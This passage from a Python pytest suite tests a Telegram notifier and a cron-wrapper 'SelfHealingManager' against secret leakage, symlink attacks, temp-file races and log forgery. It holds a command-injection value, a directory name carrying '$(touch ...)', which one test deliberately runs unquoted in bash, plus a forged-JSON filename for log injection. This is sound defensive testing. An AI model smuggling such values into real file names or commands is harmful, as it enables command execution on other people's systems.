        assert send_results.count(SendResult.DELIVERED) == 1
        assert send_results.count(SendResult.DEDUPED) == 4


def test_notifier_repr_does_not_leak_secrets(tmp_path):
    """Nebula Cycle 30: __repr__ does not leak bot_token, api_secret, or credentials."""
    env_file = tmp_path / ".env"
    bot_token = "123456789:ABCdefGhIjkLmNoPqRsTuVwXyZ_12345"
    api_secret = "sk_live_super_secret_high_entropy_token_999"
    env_file.write_text(
        f"TELEGRAM_BOT_TOKEN={bot_token}\n"
        f"OPENAI_API_KEY={api_secret}\n"
    )

    notifier = HermesTelegramNotifier(
        env_file=env_file,
        target_chat_id=TEST_CHAT_ID,
        bot_token=bot_token,
    )

    repr_str = repr(notifier)
    assert bot_token not in repr_str
    assert "ABCdef" not in repr_str
    assert api_secret not in repr_str
    assert "HermesTelegramNotifier" in repr_str
    assert TEST_CHAT_ID in repr_str


# ==============================================================================
# 5. Tests: SelfHealingManager
# ==============================================================================
def test_self_healing_manager_drift_skips(tmp_path):
    jobs_file = tmp_path / "jobs.json"
    initial_data = {
        "updated_at": "2026-10-10T00:00:00Z",
        "jobs": [
            {
                "id": "job_drifted_1",
                "name": "media-footage-producer",
                "model": None,
                "provider": None,
                "model_snapshot": "cx/gpt-5.6-luna",
                "provider_snapshot": "custom",
                "drift_alerted": True,
                "last_error": "RuntimeError: [drift_skip:silent] Skipped to prevent unintended spend",
                "last_status": "error",
            },
            {
                "id": "job_clean_2",
                "name": "healthy-job",
                "model": "codex",
                "provider": "custom",
                "model_snapshot": "codex",
                "provider_snapshot": "custom",
                "drift_alerted": False,
                "last_error": None,
                "last_status": "scheduled",
            },
        ],
    }
    with open(jobs_file, "w", encoding="utf-8") as f:
        json.dump(initial_data, f, indent=2)

    manager = SelfHealingManager(jobs_path=jobs_file)
    healed = manager.self_heal_drift_skips()

    assert len(healed) == 1
    assert healed[0]["id"] == "job_drifted_1"
    assert healed[0]["model"] == "codex"
    assert healed[0]["provider"] == "custom"

    # Verify updated content on disk
    with open(jobs_file, "r", encoding="utf-8") as f:
        saved = json.load(f)

    job1 = saved["jobs"][0]
    assert job1["model"] == "codex"
    assert job1["provider"] == "custom"
    assert job1["model_snapshot"] == "codex"
    assert job1["provider_snapshot"] == "custom"
    assert job1["drift_alerted"] is False
    assert job1["last_error"] is None
    assert job1["last_status"] == "scheduled"


def test_self_healing_manager_install_uninstall_cron(tmp_path):
    """Verify install_hourly_cron and uninstall_hourly_cron modify jobs.json properly."""
    jobs_file = tmp_path / "jobs.json"
    with open(jobs_file, "w", encoding="utf-8") as f:
        json.dump({"jobs": []}, f, indent=2)

    manager = SelfHealingManager(jobs_path=jobs_file, repo_dir=tmp_path)
    res_inst = manager.install_hourly_cron()
    assert res_inst["status"] == "installed"
    assert res_inst["job_id"] == "job_hermes_hourly_digest"

    with open(jobs_file, "r", encoding="utf-8") as f:
        data = json.load(f)
    assert len(data["jobs"]) == 1
    assert data["jobs"][0]["id"] == "job_hermes_hourly_digest"
    assert data["jobs"][0]["no_agent"] is True
    assert data["jobs"][0]["schedule"]["expr"] == "0 * * * *"

    # Now uninstall
    res_uninst = manager.uninstall_hourly_cron()
    assert res_uninst["status"] == "uninstalled"

    with open(jobs_file, "r", encoding="utf-8") as f:
        data2 = json.load(f)
    assert len(data2["jobs"]) == 0


def test_wrapper_shlex_quoting_prevents_command_injection(tmp_path):
    """Adversarial boundary test: verify path with command injection vector is safely quoted (CWE-78)."""
    pwned_marker = tmp_path / "pwned_audit_test"
    if pwned_marker.exists():
        pwned_marker.unlink()

    malicious_repo = tmp_path / f"repo$(touch {pwned_marker})"
    manager = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=malicious_repo,
        scripts_dir=tmp_path / "scripts",
    )

    content, digest = manager.render_wrapper_content()

    # The marker file MUST NOT have been created
    assert not pwned_marker.exists(), "Command injection vulnerability: payload executed during rendering!"

    expected = shlex.quote(str(malicious_repo))
    # Strict positive oracle: the exact shlex-quoted form must be present
    assert expected in content, f"repo_dir was not shlex-quoted; expected {expected!r} in content"
    # Negative oracle: the raw $(...) sequence must not survive unquoted outside the literal
    assert "$(touch" not in content.replace(expected, ""), "injection sequence present outside quoted literal"
    assert f'"{malicious_repo}"' not in content
    assert f'={malicious_repo}' not in content
    assert len(digest) == 64

    # Behavioral execution oracle: execute bash variable assignment in real shell
    # If expected was unquoted, bash would expand $(touch ...) and create pwned_marker.
    import subprocess
    subprocess.run(["bash", "-c", f"REPO_DIR={expected}\n:"], check=True)
    assert not pwned_marker.exists(), "Command injection payload executed during bash variable assignment!"

    # Mutation test: prove that without shlex.quote, bash DOES execute the subshell payload
    unquoted_payload = str(malicious_repo)
    subprocess.run(["bash", "-c", f"REPO_DIR={unquoted_payload}\n:"], check=True)
    assert pwned_marker.exists(), "Mutation check failed: unquoted payload did not trigger injection!"
    pwned_marker.unlink()


def test_wrapper_symlinked_scripts_dir_refused(tmp_path):
    """Verify ensure_wrapper_script refuses to write to a symlinked scripts_dir (CWE-427)."""
    real_target = tmp_path / "real_scripts_target"
    real_target.mkdir(parents=True, exist_ok=True)
    symlink_dir = tmp_path / "symlinked_scripts"
    symlink_dir.symlink_to(real_target, target_is_directory=True)

    manager = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=symlink_dir,
    )

    with pytest.raises(RuntimeError, match="scripts_dir open refused"):
        manager.ensure_wrapper_script()


def test_scripts_dir_parent_symlink_refused(tmp_path):
    """Verify ensure_wrapper_script refuses to write if an ancestor directory is a symlink (CWE-427)."""
    decoy_parent = tmp_path / "decoy_parent"
    decoy_parent.mkdir(parents=True, exist_ok=True)
    symlink_parent = tmp_path / "symlink_parent"
    symlink_parent.symlink_to(decoy_parent, target_is_directory=True)
    nested_scripts_dir = symlink_parent / "nested_scripts"

    manager = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=nested_scripts_dir,
    )

    with pytest.raises(RuntimeError, match="scripts_dir ancestor is a symlink, refusing"):
        manager.ensure_wrapper_script()


def test_wrapper_write_anchored_to_validated_dir(tmp_path):
    """Verify ensure_wrapper_script writes relative to dir_fd using openat/renameat semantics."""
    scripts_dir = tmp_path / "scripts"
    manager = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )
    wrapper_path, digest = manager.ensure_wrapper_script()
    assert wrapper_path.exists()
    assert wrapper_path.name == "hermes_hourly_digest.sh"
    content = wrapper_path.read_text(encoding="utf-8")
    assert "set -euo pipefail" in content
    import hashlib
    assert hashlib.sha256(content.encode("utf-8")).hexdigest() == digest


def test_wrapper_reconciliation_overwrites_tampered_script(tmp_path):
    """Verify pre-planted or tampered wrapper script is overwritten with canonical content (CWE-427 / CWE-367)."""
    scripts_dir = tmp_path / "scripts"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    tampered_file = scripts_dir / "hermes_hourly_digest.sh"
    tampered_file.write_text("#!/bin/bash\necho 'MALICIOUS_PRE_PLANTED_PAYLOAD'\n", encoding="utf-8")

    manager = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "hermes_repo",
        scripts_dir=scripts_dir,
    )

    # Calling ensure_wrapper_script must detect content mismatch and overwrite atomically
    script_path, digest = manager.ensure_wrapper_script()

    assert script_path == tampered_file
    new_content = tampered_file.read_text(encoding="utf-8")
    assert "MALICIOUS_PRE_PLANTED_PAYLOAD" not in new_content
    assert "hourly_digest_monitor.py" in new_content
    # Verify file permissions are 0o700 (owner executable only)
    st = tampered_file.stat()
    assert (st.st_mode & 0o777) == 0o700


def test_wrapper_reconciliation_in_self_heal_drift_skips(tmp_path):
    """Verify self_heal_drift_skips automatically reconciles the wrapper script."""
    jobs_file = tmp_path / "jobs.json"
    jobs_file.write_text(json.dumps({"jobs": []}), encoding="utf-8")
    scripts_dir = tmp_path / "scripts"

    manager = SelfHealingManager(
        jobs_path=jobs_file,
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    # Wrapper does not exist initially
    wrapper = scripts_dir / "hermes_hourly_digest.sh"
    assert not wrapper.exists()

    manager.self_heal_drift_skips()

    # Wrapper must be created by self-heal
    assert wrapper.exists()
    assert (wrapper.stat().st_mode & 0o777) == 0o700


def test_scripts_dir_dangling_symlink_ancestor_refused(tmp_path):
    """CWE-427 / A1: a DANGLING symlink ancestor must be refused (prevents fail-open bypass)."""
    link = tmp_path / "dangling"
    link.symlink_to(tmp_path / "does_not_exist", target_is_directory=True)
    nested = link / "nested_scripts"
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=nested,
    )
    with pytest.raises(RuntimeError, match="symlink, refusing"):
        mgr.ensure_wrapper_script()


def test_scripts_dir_home_unset_does_not_crash(tmp_path, monkeypatch):
    """A3: HOME unset and Path.home() raising (cron/systemd) must not crash wrapper generation."""
    monkeypatch.delenv("HOME", raising=False)
    monkeypatch.delenv("USERPROFILE", raising=False)

    def mock_home():
        raise RuntimeError("No home directory entry found in environment or passwd")

    monkeypatch.setattr(Path, "home", staticmethod(mock_home))

    scripts_dir = tmp_path / "scripts"
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )
    # Must complete the real write path, not raise RuntimeError from home resolution.
    wrapper_path, sha = mgr.ensure_wrapper_script()
    assert wrapper_path.exists()
    assert len(sha) == 64


def test_scripts_dir_mid_path_symlink_refused(tmp_path):
    """Deep ancestor (not immediate parent) symlink must be refused."""
    real = tmp_path / "real"
    real.mkdir()
    link = tmp_path / "mid"
    link.symlink_to(real, target_is_directory=True)
    nested = link / "a" / "b" / "scripts"
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=nested,
    )
    with pytest.raises(RuntimeError, match="symlink, refusing"):
        mgr.ensure_wrapper_script()


def test_scripts_dir_symlink_refusal_emits_structured_audit_event(tmp_path, caplog):
    """Verify symlink refusal emits structured JSON audit event for SIEM/observability."""
    import logging
    decoy_parent = tmp_path / "decoy_parent"
    decoy_parent.mkdir(parents=True, exist_ok=True)
    symlink_parent = tmp_path / "symlink_parent"
    symlink_parent.symlink_to(decoy_parent, target_is_directory=True)
    nested_scripts_dir = symlink_parent / "nested_scripts"

    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=nested_scripts_dir,
    )

    with caplog.at_level(logging.ERROR):
        with pytest.raises(RuntimeError, match="scripts_dir ancestor is a symlink, refusing"):
            mgr.ensure_wrapper_script()

    # Verify structured audit event exists in log records
    found_event = False
    for record in caplog.records:
        try:
            data = json.loads(record.message)
            if data.get("event") == "scripts_dir_symlink_refused":
                assert data.get("component") in (str(symlink_parent), symlink_parent.name)
                assert data.get("scripts_dir") == str(nested_scripts_dir)
                assert "euid" in data
                assert "ts" in data
                found_event = True
                break
        except (json.JSONDecodeError, TypeError):
            continue
    assert found_event, "Structured audit log event 'scripts_dir_symlink_refused' was not emitted!"


def test_home_fallback_target_is_safe(tmp_path, monkeypatch):
    """B2 / A2: Fallback when Path.home() raises must land cleanly in scripts_dir without putting /tmp on PATH."""
    monkeypatch.delenv("HOME", raising=False)
    monkeypatch.delenv("USERPROFILE", raising=False)
    monkeypatch.setattr(Path, "home", staticmethod(lambda: (_ for _ in ()).throw(RuntimeError("Unset home"))))

    target_scripts = tmp_path / "custom_scripts"
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=target_scripts,
    )
    wp, digest = mgr.ensure_wrapper_script()
    assert wp.exists()
    assert wp.parent == target_scripts
    content = wp.read_text(encoding="utf-8")
    # Must NOT put world-writable /tmp on PATH
    assert "/tmp/.local/bin" not in content
    assert "/usr/local/bin" in content


def test_wrapper_temp_is_exclusive_and_nofollow(tmp_path):
    """B3 / A3: Temp creation must use O_CREAT | O_EXCL | O_NOFOLLOW in the real implementation."""
    SelfHealingManager.reset_circuit_breaker()
    scripts_dir = tmp_path / "scripts"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    opened_flags = []
    orig_open = os.open

    def spy_open(path, flags, *args, **kwargs):
        opened_flags.append((path, flags))
        return orig_open(path, flags, *args, **kwargs)

    with patch("os.open", side_effect=spy_open):
        wp, digest = mgr.ensure_wrapper_script()

    assert wp.exists()

    # Find the temp file open in opened_flags:
    temp_opens = [
        (path, flags) for (path, flags) in opened_flags
        if isinstance(path, str) and path.startswith(".hermes_hourly_digest.sh.tmp.")
    ]
    assert len(temp_opens) == 1, f"Expected 1 temp file open, got {temp_opens}"
    temp_path, flags = temp_opens[0]
    # Cryptographic unpredictability: 128-bit hex token (32 hex characters)
    assert re.match(r"^\.hermes_hourly_digest\.sh\.tmp\.[0-9a-f]{32}$", temp_path), f"Temp path {temp_path} is not cryptographic token_hex(16)"
    assert flags & os.O_CREAT != 0, "O_CREAT flag missing"
    assert flags & os.O_EXCL != 0, "O_EXCL flag missing (vulnerable to pre-planted symlink/file hijacking!)"
    assert flags & getattr(os, "O_NOFOLLOW", 0) != 0, "O_NOFOLLOW flag missing"


def test_wrapper_temp_collision_retry_defends_against_dos(tmp_path, caplog):
    """B1 / B2: Cryptographic unpredictability and bounded retries defeat pre-planted collision DoS."""
    SelfHealingManager.reset_circuit_breaker()
    import logging
    scripts_dir = tmp_path / "scripts_dos_test"
    scripts_dir.mkdir(parents=True, exist_ok=True)

    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    planted_token = "a" * 32
    fresh_token = "b" * 32
    planted_file = scripts_dir / f".hermes_hourly_digest.sh.tmp.{planted_token}"
    planted_file.write_text("PRE_PLANTED_COLLISION_DATA", encoding="utf-8")

    # First attempt draws colliding token, second attempt draws fresh token
    tokens = [planted_token, fresh_token, "c" * 32, "d" * 32]

    with caplog.at_level(logging.WARNING):
        with patch("secrets.token_hex", side_effect=tokens):
            wp, digest = mgr.ensure_wrapper_script()

    # Self-healing succeeded despite the pre-planted collision!
    assert wp.exists()
    assert planted_file.read_text(encoding="utf-8") == "PRE_PLANTED_COLLISION_DATA"

    # SIEM telemetry verified: caught collision and retried
    retry_records = [
        json.loads(r.message) for r in caplog.records
        if "temp_collision_retry" in r.message
    ]
    assert len(retry_records) >= 1
    assert retry_records[0]["event"] == "temp_collision_retry"
    assert retry_records[0]["attempt"] == 1


def test_wrapper_temp_exhaustion_fails_closed_and_emits_siem_event(tmp_path, caplog):
    """B1 / B2: Persistent collisions fail closed after max_retries with SIEM audit log."""
    SelfHealingManager.reset_circuit_breaker()
    import logging
    scripts_dir = tmp_path / "scripts_exhaust_test"
    scripts_dir.mkdir(parents=True, exist_ok=True)

    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    # Force continuous collision by returning a fixed token
    colliding_token = "f" * 32
    planted_file = scripts_dir / f".hermes_hourly_digest.sh.tmp.{colliding_token}"
    planted_file.write_text("PRE_PLANTED_WALL", encoding="utf-8")

    with caplog.at_level(logging.ERROR):
        with patch("secrets.token_hex", return_value=colliding_token):
            with pytest.raises(FileExistsError):
                mgr.ensure_wrapper_script()

    # Pre-planted file was never overwritten
    assert planted_file.read_text(encoding="utf-8") == "PRE_PLANTED_WALL"

    # Verified SIEM audit record
    exhaust_records = [
        json.loads(r.message) for r in caplog.records
        if "temp_create_exhausted" in r.message
    ]
    assert len(exhaust_records) == 1
    assert exhaust_records[0]["event"] == "temp_create_exhausted"
    assert exhaust_records[0]["max_retries"] == SelfHealingManager.TEMP_MAX_RETRIES


def test_circuit_breaker_thread_safety():
    """B3 / CWE-362: Circuit breaker state mutation is serialized across concurrent threads."""
    import concurrent.futures
    SelfHealingManager.reset_circuit_breaker()

    status = SelfHealingManager.get_circuit_status()
    assert status["failures"] == 0
    assert not status["is_open"]

    def trip_breaker():
        with SelfHealingManager._circuit_lock:
            SelfHealingManager._wrapper_failures += 1
            if SelfHealingManager._wrapper_failures >= SelfHealingManager.CIRCUIT_MAX_FAILURES:
                SelfHealingManager._wrapper_circuit_open_until = time.time() + SelfHealingManager.CIRCUIT_COOLDOWN_SECONDS

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(trip_breaker) for _ in range(10)]
        concurrent.futures.wait(futures)

    status_after = SelfHealingManager.get_circuit_status()
    assert status_after["failures"] == 10
    assert status_after["is_open"] is True

    SelfHealingManager.reset_circuit_breaker()
    status_reset = SelfHealingManager.get_circuit_status()
    assert status_reset["failures"] == 0
    assert status_reset["is_open"] is False


def test_scripts_dir_mode_and_ownership_hardening(tmp_path):
    """B4 / A4: scripts_dir with permissive mode (0o777) must be hardened to 0o700."""
    SelfHealingManager.reset_circuit_breaker()
    permissive_dir = tmp_path / "permissive_scripts"
    permissive_dir.mkdir(mode=0o777, parents=True, exist_ok=True)
    os.chmod(permissive_dir, 0o777)
    assert (permissive_dir.stat().st_mode & 0o077) != 0

    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=permissive_dir,
    )
    wp, _ = mgr.ensure_wrapper_script()
    assert wp.exists()
    # Directory permissions must now be 0o700 (no group or world bits)
    st = permissive_dir.stat()
    assert (st.st_mode & 0o077) == 0


def test_scripts_dir_alien_ownership_refused(tmp_path):
    """B4 / A4: scripts_dir owned by another UID must be refused with PermissionError, not chmodded."""
    SelfHealingManager.reset_circuit_breaker()
    scripts_dir = tmp_path / "alien_scripts"
    scripts_dir.mkdir(parents=True, exist_ok=True)

    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    orig_fstat = os.fstat

    def alien_fstat(fd):
        real_st = orig_fstat(fd)
        class FakeStat:
            pass
        st = FakeStat()
        for attr in ("st_mode", "st_ino", "st_dev", "st_nlink", "st_gid", "st_size", "st_atime", "st_mtime", "st_ctime"):
            setattr(st, attr, getattr(real_st, attr, 0))
        st.st_uid = os.geteuid() + 1000  # Alien UID
        return st

    with patch("os.fstat", side_effect=alien_fstat):
        with pytest.raises(PermissionError, match="scripts_dir not owned by current user"):
            mgr.ensure_wrapper_script()


def test_audit_event_resists_log_injection(tmp_path, caplog):
    """B5 / A5: Component name containing newlines and forged JSON must be escaped cleanly by json.dumps."""
    SelfHealingManager.reset_circuit_breaker()
    import logging
    real_dir = tmp_path / "real_target"
    real_dir.mkdir(parents=True, exist_ok=True)
    symlink_evil = tmp_path / "symlink\n{\"event\":\"forged_fake_pass\"}"
    symlink_evil.symlink_to(real_dir, target_is_directory=True)
    nested_scripts_dir = symlink_evil / "scripts"

    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=nested_scripts_dir,
    )

    with caplog.at_level(logging.ERROR):
        with pytest.raises(RuntimeError, match="symlink, refusing"):
            mgr.ensure_wrapper_script()

    refused_records = []
    for record in caplog.records:
        try:
            parsed = json.loads(record.message)
            if parsed.get("event") == "scripts_dir_symlink_refused":
                refused_records.append(parsed)
            # DOWNSTREAM SIEM AUDIT GUARD: prove that no record has the forged event
            assert parsed.get("event") != "forged_fake_pass", "SIEM forgery detected: inner JSON escaped into top-level event!"
        except json.JSONDecodeError:
            pytest.fail(f"Log message is not valid JSON: {record.message}")

    assert len(refused_records) == 1
    rec = refused_records[0]
    assert rec["event"] == "scripts_dir_symlink_refused"
    assert "forged_fake_pass" in rec["component"]
    assert "\n" in rec["component"]


def test_wrapper_manifest_pinned_execution(tmp_path):
    """A6 / Manifest-Pinned Execution: Bash wrapper validates companion manifest before executing."""
    SelfHealingManager.reset_circuit_breaker()
    scripts_dir = tmp_path / "scripts"
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )
    wp, digest = mgr.ensure_wrapper_script()

    manifest_file = scripts_dir / ".hermes_hourly_digest.sh.manifest"
    assert manifest_file.exists()
    assert (manifest_file.stat().st_mode & 0o777) == 0o600
    manifest_content = manifest_file.read_text(encoding="utf-8")
    assert digest in manifest_content
    assert "hermes_hourly_digest.sh" in manifest_content

    # Behavioral test: sha256sum verification passes on untampered script
    res = subprocess.run(["sha256sum", "-c", str(manifest_file), "--status"], cwd=scripts_dir)
    assert res.returncode == 0

    # Tampering with wrapper causes sha256sum verification to fail
    with open(wp, "a", encoding="utf-8") as f:
        f.write("# unauthorized modification\n")

    res_tampered = subprocess.run(["sha256sum", "-c", str(manifest_file), "--status"], cwd=scripts_dir)
    assert res_tampered.returncode != 0


def test_wrapper_failure_cleans_up_temp_and_trips_circuit_breaker(tmp_path):
    """Counterfactual outage test: failure during rename unlinks temp file and trips circuit breaker after 3 attempts."""
    SelfHealingManager.reset_circuit_breaker()
    import errno
    scripts_dir = tmp_path / "scripts_enospc"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    # Inject ENOSPC on os.replace
    orig_replace = os.replace

    def enospc_replace(src, dst, *args, **kwargs):
        raise OSError(errno.ENOSPC, "No space left on device")

    with patch("os.replace", side_effect=enospc_replace):
        # Attempt 1: fails with ENOSPC
        with pytest.raises(OSError, match="No space left on device"):
            mgr.ensure_wrapper_script()
        # Verify no orphaned temp files left in scripts_dir
        temp_files_1 = [f.name for f in scripts_dir.iterdir() if f.name.startswith(".hermes_hourly_digest.sh.tmp.")]
        assert len(temp_files_1) == 0, f"Orphaned temp files left behind after failure: {temp_files_1}"

        # Attempt 2: fails with ENOSPC
        with pytest.raises(OSError, match="No space left on device"):
            mgr.ensure_wrapper_script()

        # Attempt 3: fails with ENOSPC -> trips circuit breaker
        with pytest.raises(OSError, match="No space left on device"):
            mgr.ensure_wrapper_script()

    # Attempt 4 (circuit breaker open): refuses immediately without attempting filesystem I/O
    with pytest.raises(RuntimeError, match="Wrapper reconciliation circuit breaker OPEN"):
        mgr.ensure_wrapper_script()

    # Reset circuit breaker restores normal operation
    SelfHealingManager.reset_circuit_breaker()
    wp, _ = mgr.ensure_wrapper_script()
    assert wp.exists()


def test_wrapper_temp_fatal_errno_does_not_retry(tmp_path, caplog):
    """CWE-377 / DoS Defense: Fatal errno (ENOSPC) must fail immediately on attempt 1 without retrying."""
    SelfHealingManager.reset_circuit_breaker()
    import errno
    import logging
    scripts_dir = tmp_path / "scripts_fatal_errno"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    temp_attempts = []
    orig_open = os.open

    def enospc_temp_open(path, flags, *args, **kwargs):
        if isinstance(path, str) and path.startswith(".hermes_hourly_digest.sh.tmp."):
            temp_attempts.append(path)
            raise OSError(errno.ENOSPC, "No space left on device")
        return orig_open(path, flags, *args, **kwargs)

    with caplog.at_level(logging.ERROR):
        with patch("os.open", side_effect=enospc_temp_open):
            with pytest.raises(OSError, match="No space left on device"):
                mgr.ensure_wrapper_script()

    # CRITICAL: exactly 1 attempt! No futile retries on ENOSPC
    assert len(temp_attempts) == 1, f"Expected exactly 1 attempt on ENOSPC, got {len(temp_attempts)} (amplification DoS detected!)"

    # SIEM telemetry verified: emitted fatal errno record
    fatal_records = [
        json.loads(r.message) for r in caplog.records
        if "temp_create_fatal_errno" in r.message
    ]
    assert len(fatal_records) == 1
    assert fatal_records[0]["event"] == "temp_create_fatal_errno"
    assert fatal_records[0]["errno"] == errno.ENOSPC
    assert fatal_records[0]["attempt"] == 1


def test_wrapper_refuses_without_nofollow(tmp_path):
    """CWE-59 Fail-Closed: System must refuse operation if platform lacks O_NOFOLLOW."""
    SelfHealingManager.reset_circuit_breaker()
    scripts_dir = tmp_path / "scripts_no_nofollow"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    # Monkeypatch away os.O_NOFOLLOW
    with patch.object(os, "O_NOFOLLOW", None, create=True):
        with pytest.raises(RuntimeError, match="O_NOFOLLOW unavailable on this platform; refusing to inspect scripts without symlink protection"):
            mgr.ensure_wrapper_script()


def test_entropy_draw_count_is_bounded(tmp_path):
    """Entropy Contract: Clean creation consumes exactly 2 cryptographic draws (1 wrapper, 1 manifest)."""
    SelfHealingManager.reset_circuit_breaker()
    scripts_dir = tmp_path / "scripts_entropy_contract"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    draws = []
    orig_token = mgr._token_source

    def spy_token(nbytes=16):
        res = orig_token(nbytes)
        draws.append(res)
        return res

    with patch.object(mgr, "_token_source", side_effect=spy_token):
        wp, digest = mgr.ensure_wrapper_script()

    assert wp.exists()
    # Guarantee spy actually fired!
    assert len(draws) > 0, "Entropy spy did not fire at all!"
    # Exactly 2 draws on happy path: 1 for wrapper temp, 1 for manifest temp
    assert len(draws) == 2, f"Expected exactly 2 entropy draws on initial creation, got {len(draws)}: {draws}"


def test_atomic_publish_uses_os_replace(tmp_path):
    """CWE-494: Wrapper publication must use atomic os.replace."""
    SelfHealingManager.reset_circuit_breaker()
    scripts_dir = tmp_path / "scripts_atomic_replace"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    replace_calls = []
    orig_replace = os.replace

    def spy_replace(src, dst, *args, **kwargs):
        replace_calls.append((src, dst))
        return orig_replace(src, dst, *args, **kwargs)

    with patch("os.replace", side_effect=spy_replace):
        wp, digest = mgr.ensure_wrapper_script()

    # Both wrapper and manifest must be published via os.replace
    assert len(replace_calls) == 2
    wrapper_replaces = [dst for (src, dst) in replace_calls if dst == "hermes_hourly_digest.sh"]
    manifest_replaces = [dst for (src, dst) in replace_calls if dst == ".hermes_hourly_digest.sh.manifest"]
    assert len(wrapper_replaces) == 1
    assert len(manifest_replaces) == 1


def test_breaker_no_double_open_under_contention(tmp_path):
    """CWE-362: Concurrent contention across threads trips circuit breaker cleanly once."""
    SelfHealingManager.reset_circuit_breaker()
    import concurrent.futures
    import errno

    scripts_dir = tmp_path / "scripts_contention"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    def failing_replace(*args, **kwargs):
        raise OSError(errno.ENOSPC, "Contention injected error")

    with patch("os.replace", side_effect=failing_replace):
        def worker_task():
            try:
                mgr.ensure_wrapper_script()
                return "SUCCESS"
            except Exception as e:
                return str(e)

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            results = list(executor.map(lambda _: worker_task(), range(10)))

    # Circuit breaker must be open
    status = SelfHealingManager.get_circuit_status()
    assert status["is_open"] is True
    assert status["failures"] >= SelfHealingManager.CIRCUIT_MAX_FAILURES


def test_publish_is_recoverable_after_crash_between_replaces(tmp_path):
    """CWE-494 / Crash Transactionality: Interruption between wrapper and manifest replaces recovers cleanly."""
    SelfHealingManager.reset_circuit_breaker()
    scripts_dir = tmp_path / "scripts_crash_recovery"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    orig_replace = os.replace

    class SimulatedCrash(RuntimeError):
        pass

    # Inject crash right after wrapper replace succeeds, but before manifest replace
    def crash_after_wrapper_replace(src, dst, *args, **kwargs):
        res = orig_replace(src, dst, *args, **kwargs)
        if dst == "hermes_hourly_digest.sh":
            raise SimulatedCrash("Process killed / power outage between replaces")
        return res

    # Initial execution crashes
    with patch("os.replace", side_effect=crash_after_wrapper_replace):
        with pytest.raises(SimulatedCrash):
            mgr.ensure_wrapper_script()

    # Disk state post-crash: wrapper exists on disk, manifest does NOT exist!
    wrapper_path = scripts_dir / "hermes_hourly_digest.sh"
    manifest_path = scripts_dir / ".hermes_hourly_digest.sh.manifest"
    assert wrapper_path.exists(), "Wrapper script must exist after first replace"
    assert not manifest_path.exists(), "Manifest must NOT exist yet after simulated crash"

    # Reset circuit breaker (to simulate a new process run)
    SelfHealingManager.reset_circuit_breaker()

    # Subsequent run detects canonical wrapper and self-heals the manifest without error
    wp, digest = mgr.ensure_wrapper_script()
    assert wp.exists()
    assert manifest_path.exists(), "Manifest must be self-healed by subsequent run"

    # Verify sha256sum integrity check passes
    res = subprocess.run(
        ["sha256sum", "-c", manifest_path.name],
        cwd=scripts_dir,
        capture_output=True,
        text=True,
    )
    assert res.returncode == 0, f"sha256sum verification failed: {res.stderr}"

    # Breaker must remain CLOSED and healthy
    status = SelfHealingManager.get_circuit_status()
    assert status["is_open"] is False


@pytest.mark.parametrize(
    "err_code, err_name",
    [
        (errno.ENOSPC, "ENOSPC"),
